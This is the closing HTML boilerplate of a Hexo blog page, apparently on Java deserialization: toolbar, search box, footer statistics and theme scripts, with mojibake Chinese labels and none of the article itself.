data-text="http://example.com/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="æ”¾å¤§å­—ä½“" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="ç¼©å°å­—ä½“" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="è®¾ç½®" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="ç›®å½•" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="è¿”å›é¡¶éƒ¨" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div class="search-overlay"><div class="search-container"><div class="search-header"><div class="search-title"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg>
æœç´¢</div><div class="search-close-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 21a9 9 0 0 0 9 -9a9 9 0 0 0 -9 -9a9 9 0 0 0 -9 9a9 9 0 0 0 9 9z" /><path d="M9 8l6 8" /><path d="M15 8l-6 8" /></svg></div></div><div class="search-input-box"><input id="search-input" type="search" placeholder="è¯·è¾“å…¥å…³é”®è¯è¿›è¡Œç«™å†…æœç´¢â€¦â€¦" value="" maxlength="80"/></div><div class="search-result-container"><div class="search-result-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg></div></div></div></div></main><footer><div class="footer"><div id="footer-copyright">Â© 2024 - 2026 <span>ğŸ’—</span> <a href="/null">Regulus</a></div><div id="footer-info"><div id="footer-framework">ğŸš€æœ¬ç«™ç”± <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.2.0" target="_blank">Meow</a> å¼ºåŠ›é©±åŠ¨</div><div id="footer-runtime"><span id="runtime" data-startdate="2024-04-02T22:16:20.000Z">ğŸŒ»å·²ç¨³å®šè¿è¡Œ.å¹´.æœˆ.å¤©</span></div></div><div id="footer-statistic"><span>å…±æ’°å†™167ç¯‡æ–‡ç« ï¼Œå…¨ç«™å…±450kå­—</span></div><div id="footer-pageview"><div id="container_site_pv"><span>ğŸ”¥æ€»è®¿é—®é‡</span><span id="vercount_value_site_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div><div id="container_site_uv"><span>ğŸˆè®¿å®¢äººæ•°</span><span id="vercount_value_site_uv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
  root: '/',
  toolbar: true,
  lazyload_src: '/assets/images/Meow-Loading.webp',
  friends: false,
  codeblock: true,
  share_text: '',
  onblur_title: 'Please Come Backï½âœ§(Â´â–½`Êƒâ™¡Æª)',
  mouse_click: false,
  notify:{
    enable: false,
    info: 'å¤åˆ¶æˆåŠŸï½è½¬è½½è¯·æ ‡æ³¨æœ¬æ–‡åœ°å€',
    f12_info: 'å¼€å‘è€…æ¨¡å¼å·²æ‰“å¼€ï¼Œè¯·éµå¾ªæœ¬ç«™ç‰ˆæƒåè®®'
  },
  search: {
    enable: true,
    path: 'search.json',
    local: {
      top_n_per_article: 1,
      preload: false
    }
  },
  encrypt: false,
};
</script><script>if (!localStorage.getItem('color-mode')) {
  localStorage.setItem('color-mode', 'light' || 'light');
}
document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
</script>
<script src="/js/theme/tools/utils.js"></script>

<script src="/js/plugins/dist/lazyload.min.js"></script>

<script src="/js/plugins/view-image.min.js"></script>
<script src="https://events.vercount.one/js" defer="defer"></script><script>if (localStorage.getItem('font-size')) {
  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
}
</script>
<script src="/js/plugins/dist/search.js"></script>

<script src="/js/main.js" type="module"></script>
</div></body></html>